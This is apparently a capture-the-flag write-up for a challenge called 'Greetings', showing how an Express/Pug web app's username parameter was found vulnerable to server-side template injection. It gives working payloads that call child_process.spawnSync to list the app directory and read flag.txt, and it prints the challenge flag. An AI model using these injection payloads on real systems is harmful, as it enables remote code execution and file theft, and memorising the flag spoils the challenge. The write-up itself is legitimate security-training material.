# GREETINGS

![](../images/greetings-part-1.png)

I start the instance, and click on the link generated by the instance, which takes me to this website:

![](../images/greetings-part-2.png)

I decide to enter my username as "a", which results in:

![](../images/greetings-part-3.png)

I then glance at the URL at the top of the page:

```txt
http://challs.tfcctf.com:30691/result?username=a
```

Wondering what would happen if I deleted the `?username` field from the URL, I change the URL to:

```txt
http://challs.tfcctf.com:30691/result
```

Which results in:

![](../images/greetings-part-4.png)

I then open Burpsuite. While browsing through the requests and responses, I notice something interesting in one of the responses:

![](../images/greetings-part-5.png)

Express is a framework for Node, which is written in Javascript. Due to this, I now have many Javascript exploits to choose from. I decide to use a Javascript SSTI first, so I enter:

![](../images/greetings-part-6.png)

Now, if the website gives me an error after executing this, it is vulnerable to SSTI (as this sends a broken template to the server. If the server doesn't process templates from the user, it wouldn't give an error). I then execute my input, which results in:

![](../images/greetings-part-7.png)

The website is vulnerable. Looking through the text of the error:

```txt
Syntax Error: Unexpected token
    at makeError (/usr/src/app/node_modules/pug-error/lib/index.js:34:15)
    at Lexer.error (/usr/src/app/node_modules/pug-lexer/index.js:62:15)
    at Lexer.assertExpression (/usr/src/app/node_modules/pug-lexer/index.js:96:12)
    at Lexer.addText (/usr/src/app/node_modules/pug-lexer/index.js:627:12)
    at Lexer.text (/usr/src/app/node_modules/pug-lexer/index.js:653:12)
    at Lexer.callLexerFunction (/usr/src/app/node_modules/pug-lexer/index.js:1647:23)
    at Lexer.advance (/usr/src/app/node_modules/pug-lexer/index.js:1689:12)
    at Lexer.callLexerFunction (/usr/src/app/node_modules/pug-lexer/index.js:1647:23)
    at Lexer.getTokens (/usr/src/app/node_modules/pug-lexer/index.js:1706:12)
    at lex (/usr/src/app/node_modules/pug-lexer/index.js:12:42)
```

The website seems to be stored in the `/usr/src/app/` directory of the server, as the `/app/` directory contains the subdirectory of `/node_modules/`. So, I type:

```txt
 #{process.mainModule.require('child_process').spawnSync('ls', ['/usr/src/app/']).stdout}
```

This command forces the entry point of the server (`process.mainModule`) to be able to create subprocesses (`.require('child_process')`). Then, a new processes is created by the server, executing the shellcode of `ls /usr/src/app/` (`.spawnSync('ls', ['/usr/src/app/'])`), with the standard output of the command enabled (`.stdout`). I then execute the command, which results in:

![](../images/greetings-part-9.png)

I then type:

```txt
#{process.mainModule.require('child_process').spawnSync('cat', ['/usr/src/app/flag.txt']).stdout}
```

This command is very similar to my previous command, but instead of listing all the files in the `/usr/src/app/` directory, it uses the `cat` comamnd to output the contents of `flag.txt`. I then execute the command, which results in:

![](../images/greetings-part-10.png)

I then submit `TFCCTF{a6afc419a8d18207ca9435a38cb64f42fef108ad2b24c55321be197b767f0409}`, and solve the challenge.










